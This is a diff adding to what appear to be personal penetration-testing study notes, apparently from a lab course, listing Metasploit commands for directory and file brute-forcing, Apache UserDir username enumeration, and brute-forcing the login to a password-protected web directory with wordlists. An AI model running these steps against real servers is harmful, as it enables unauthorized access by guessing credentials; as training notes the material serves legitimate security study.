@@ -259,3 +259,44 @@ Additionally, important to note is the robots.txt file. The robots.txt file ist 
 ![image](https://github.com/user-attachments/assets/26fb24c2-672c-42c1-8580-912acc06892b)
 
 - This means this sections is password secured
+
+**Directory bruteforce**
+- `search dir_scanner`
+- `use auxiliary/scanner/http/dir_scanner`
+- `options`
+- `run`
+
+**File bruteforce**
+- `search files_dir`
+- `use auxiliary/scanner/http/files_dir`
+- `options`
+- `run`
+
+**Bruteforce to get Webserver User and PW**
+- `search http_login`
+- `use auxiliary/scanner/http/http_login`
+- `options`
+- `set AUTH_URI /secure/` Set the right URI, in this case we want to brutforce the credentials to the secure directory.
+- `unset USERPASS_FILE` unset userpassword file because we already have user and password file.
+- `run`
+- If this does not work you can try with another passwordsfile
+- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt`
+- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+- `set VERBOSE false` that the script will not print all failed attemps
+- IF this does not work you can try to enumerate the users first. Because apache with the UserDir directive enabled generates diffrent error codes when a username exists which can allow to determine valid usernames on the server.
+- `search apache_userdir_enum`
+- `use search apache_userdir_enum`
+- `options`
+- `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
+- `run`
+- We can now run the bruteforce again with the detected username/s
+- `use auxiliary/scanner/http/http_login`
+- `options`
+- `echo "alice, backup, bin, bob, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, proxy, sync, sys, uucp" > users.txt`make a new file with the usernames in it
+- `set USER_FILE users.txt`
+- `unset USERPASS_FILE`
+- `run`
+
+![image](https://github.com/user-attachments/assets/0039f3c9-ef47-44a9-a780-c3c0dc230598)
+
+
